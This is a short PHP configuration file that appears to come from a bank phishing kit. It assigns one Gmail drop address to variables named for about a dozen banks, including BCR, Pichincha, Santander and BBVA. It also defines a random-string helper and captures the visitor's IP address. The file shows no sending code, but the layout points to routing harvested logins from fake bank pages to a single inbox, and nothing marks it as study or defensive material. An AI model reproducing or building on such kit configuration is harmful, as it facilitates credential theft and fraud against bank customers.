<?php

$correo="equipo13111@gmail.com";
$correo_BANCOBCR="equipo13111@gmail.com";
$correo_pichincha_E="equipo13111@gmail.com";
$correo_RUMINAHUI="equipo13111@gmail.com";
$bancopromerica="equipo13111@gmail.com";

$correo_santander_c="equipo13111@gmail.com";
$correo_bbva_c="equipo13111@gmail.com";
$GUAYA="equipo13111@gmail.com";
$bolivariano="equipo13111@gmail.com";
$correo_MUTUALISTAPICHINCHA="equipo13111@gmail.com";
function randomString($length)
{
    $string = md5(time());
    $highest_startpoint = 32-$length;
    $randomString = substr($string,rand(0,$highest_startpoint),$length);
    return $randomString;
}
$ip = $_SERVER[REMOTE_ADDR];
?>
